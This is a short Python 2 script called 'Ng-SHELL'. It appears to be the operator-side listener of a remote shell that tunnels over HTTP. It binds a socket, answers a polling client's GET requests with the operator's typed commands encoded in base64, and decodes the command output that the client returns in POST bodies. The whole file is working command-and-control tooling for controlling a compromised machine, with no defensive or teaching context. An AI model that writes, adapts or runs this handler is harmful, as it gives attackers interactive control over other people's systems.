import socket, sys, base64, os, time
from colorama import Fore, Back, Style
from threading import Thread
import urllib

http_response = """\
HTTP/1.1 200 OK

"""

print Back.BLACK
os.system('clear')
print Fore.RED
time.sleep(1)
os.system('figlet Ng-SHELL')
time.sleep(0.5)
print Fore.BLUE+'\n[+] Waiting for connection...\n'


so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
so.bind(('127.0.0.1',  int(sys.argv[1])))
so.listen(1)

def base64_decode(text):
	x = len(text)
	if x % 4 != 0:
		return base64.b64decode(text+'='*(4-(x%4)))
	else:
		return base64.b64decode(text)

def handle(msg, sock):
	global so
	if 'POST' in msg:
		try:
			print base64_decode(msg.split('SPLITHERE')[1][1:].split('%')[0][:-1])
		except:
			print 'Output Error'
		finally:
			sock.close()
	else:
		try:
			sock.sendall(http_response+base64.b64encode(raw_input(Fore.GREEN+'[ng-shell] ~> ')))
			sock.close()
		except Exception as x:
			so.close()
			sock.close()
			print x
			sys.exit()

def receive():
	global so
	sock, data = so.accept()
	dados = sock.recv(1024)
	handle(dados, sock)

try:
	while 1:
		receive()
except:
	so.close()
	sys.exit()
